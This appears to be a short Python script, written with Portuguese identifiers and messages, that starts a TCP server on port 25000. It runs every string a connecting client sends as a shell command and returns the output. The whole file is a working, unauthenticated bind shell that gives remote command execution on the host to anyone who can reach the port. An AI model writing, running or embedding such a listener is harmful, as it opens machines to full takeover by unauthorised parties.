import socket as s
import subprocess as subp


def iniciar():
    socket = s.socket(s.AF_INET, s.SOCK_STREAM)
    socket.bind(('', 25000))
    socket.listen(1)

    while True:
        try:
            print('Esperando conexão...')
            connection, addr = socket.accept()
            print('Conexão aceita.')
            atenderCliente(connection)
        except KeyboardInterrupt:
            break

    print('Servidor encerrado.')
    socket.close()


def atenderCliente(connection):

    while True:
        try:
            comando = connection.recv(2048).decode('utf-8')
            if comando.lower() == 'exit':
                break

            try:

                resultado_cmd = subp.check_output(comando,
                                                  universal_newlines=True,
                                                  shell=True,
                                                  stderr=subp.STDOUT)
                if not resultado_cmd:
                    resultado_cmd = 'O comando não pôde ser executado.'

            except (FileNotFoundError, subp.CalledProcessError):
                resultado_cmd = 'Comando não encontrado.'

            connection.send(resultado_cmd.encode('utf-8'))
        except:
            break

    connection.close()
    print('Conexão encerrada')


if __name__ == '__main__':
    iniciar()
